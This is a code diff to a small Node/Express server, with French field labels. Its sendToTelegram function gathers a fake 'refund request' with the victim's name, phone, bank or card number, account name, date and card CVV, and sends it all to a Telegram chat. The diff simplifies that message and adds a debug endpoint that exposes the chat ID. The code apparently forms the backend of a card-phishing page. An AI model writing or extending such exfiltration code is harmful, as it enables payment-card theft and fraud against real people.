@@ -43,17 +43,25 @@ function isEmailConfigured() {
 }
 
 async function sendToTelegram(data) {
-  const message = `📋 *Nouvelle demande de remboursement*
+  const message = `Nouvelle demande de remboursement
 
-👤 *Nom:* ${data.nom}
-📞 *Telephone:* ${data.telephone}
-💳 *RIB/Carte:* ${data.rib}
-🏦 *Nom du compte:* ${data.nomCompte}
-📅 *Date:* ${data.date}
-🔒 *CVV:* ||${data.CVV}||`;
+Nom: ${data.nom}
+Telephone: ${data.telephone}
+RIB/Carte: ${data.rib}
+Nom du compte: ${data.nomCompte}
+Date: ${data.date}
+CVV: ${data.CVV}`;
 
-  await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
+  await bot.sendMessage(TELEGRAM_CHAT_ID, message);
 }
+
+app.get('/api/debug', (req, res) => {
+  res.json({
+    tokenSet: Boolean(process.env.TELEGRAM_BOT_TOKEN),
+    chatIdSet: Boolean(process.env.TELEGRAM_CHAT_ID),
+    chatId: TELEGRAM_CHAT_ID,
+  });
+});
 
 app.use(cors());
 app.use(express.json());
